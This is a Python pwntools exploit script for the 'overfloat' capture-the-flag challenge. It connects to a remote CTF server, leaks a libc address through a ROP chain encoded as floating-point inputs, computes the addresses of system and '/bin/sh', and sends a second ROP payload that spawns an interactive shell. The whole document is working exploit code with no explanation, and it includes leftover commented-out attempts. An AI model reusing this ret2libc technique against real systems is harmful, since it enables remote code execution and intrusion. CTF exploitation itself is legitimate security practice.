from pwn import *
import struct

e = ELF("./overfloat")
libc = ELF("./libc-2.27.so")
#p = process("./overfloat")
p = remote("challenges.fbctf.com", 1341)
for symbol in e.symbols:
	#if "system" in symbol or "bin" in symbol:
	print symbol, hex(e.symbols[symbol])

print p.recv()

pop_rdi = int("0x400a83", 16)
pop_rdi_ieee = struct.unpack('f', struct.pack('I', pop_rdi))[0]
puts_plt = e.symbols['puts']
puts_plt_ieee = struct.unpack('f', struct.pack('I', puts_plt))[0]
puts_got = e.symbols['got.puts']
puts_got_ieee = struct.unpack('f', struct.pack('I', puts_got))[0]
main = e.symbols['main']
main_ieee = struct.unpack('f', struct.pack('I', main))[0]

puts_off = int("0x809c0", 16)
binsh_off = int("0x1b3e9a", 16)
system_off = int("0x4f440", 16)

#print puts_plt_ieee
#print puts_got_ieee

payload = "1\n"*14+str(pop_rdi_ieee)+"\n0\n"+str(puts_got_ieee)+"\n0\n"+str(puts_plt_ieee)+"\n0\n"+str(main_ieee)+"\n0\n"+"done\n"
#print payload
p.send(payload)
p.recvuntil("BON VOYAGE!\n")

puts_addr = u64(p.recv(6)+'\x00\x00')
system_addr = puts_addr - puts_off + system_off
binsh_addr = puts_addr - puts_off + binsh_off

#print p.recv()
#system_addr_ieee = struct.unpack('f', struct.pack('I', system_addr))[0]
#binsh_addr_ieee = struct.unpack('f', struct.pack('I', binsh_addr))[0]

print "puts: " + hex(puts_addr)
print "system: " + hex(system_addr)#[-6*2:-4*2+1]+hex(system_addr)[-4*2:]
print "binsh: " + hex(binsh_addr)

system_addr_LHALF = hex(system_addr)[-6*2:-4*2]
system_addr_RHALF = hex(system_addr)[-4*2:]

binsh_addr_LHALF = hex(binsh_addr)[-6*2:-4*2]
binsh_addr_RHALF = hex(binsh_addr)[-4*2:]

system_addr_LHALF_ieee = struct.unpack('f', struct.pack('I', int(system_addr_LHALF,16)))[0]
system_addr_RHALF_ieee = struct.unpack('f', struct.pack('I', int(system_addr_RHALF,16)))[0]
binsh_addr_LHALF_ieee = struct.unpack('f', struct.pack('I', int(binsh_addr_LHALF, 16)))[0]
binsh_addr_RHALF_ieee = struct.unpack('f', struct.pack('I', int(binsh_addr_RHALF,16)))[0]

print system_addr_LHALF + system_addr_RHALF
print binsh_addr_LHALF + binsh_addr_RHALF
print str(pop_rdi_ieee)
print str(system_addr_LHALF_ieee) + " " + str(system_addr_RHALF_ieee)
print str(binsh_addr_LHALF_ieee) + " " + str(binsh_addr_RHALF_ieee) 

payload = "1\n"*14+str(pop_rdi_ieee)+"\n0\n"+str(binsh_addr_RHALF_ieee)+"\n"+str(binsh_addr_LHALF_ieee)+"\n"+str(system_addr_RHALF_ieee)+"\n"+str(system_addr_LHALF_ieee)+"\n"+str(pop_rdi_ieee)+"\n0\n"+str(binsh_addr_RHALF_ieee)+"\n"+str(binsh_addr_LHALF_ieee)+"\n"+str(system_addr_RHALF_ieee)+"\n"+str(system_addr_LHALF_ieee)+"\n"+"done\n"
#payload = "1\n"*14+str(pop_rdi_ieee)+"\n0\n"+str(binsh_addr_LHALF_ieee)+"\n"+str(binsh_addr_RHALF_ieee)+"\n"+str(system_addr_LHALF_ieee)+"\n"+str(system_addr_RHALF_ieee)+"\n"+"done\n"
print p.recv()
#sleep(1)
p.send(payload)
#sleep(1)
print p.recv()
#payload = "1\n"*14+str(pop_rdi_ieee)+"\n0\n"+str(binsh_addr_RHALF_ieee)+"\n"+str(binsh_addr_LHALF_ieee)+"\n"+str(system_addr_LHALF_ieee)+"\n"+str(system_addr_LHALF_ieee)+"\n"+"done\n"
#p.send(payload)
p.interactive()

'''
payload = "1\n"*14+str(pop_rdi_ieee)+"\n0\n"+str(binsh_addr_ieee)+"\n0\n"+str(system_addr_ieee)+"\n0\n"+"\n0\n"+"done\n"
p.send(payload)
p.interactive()'''
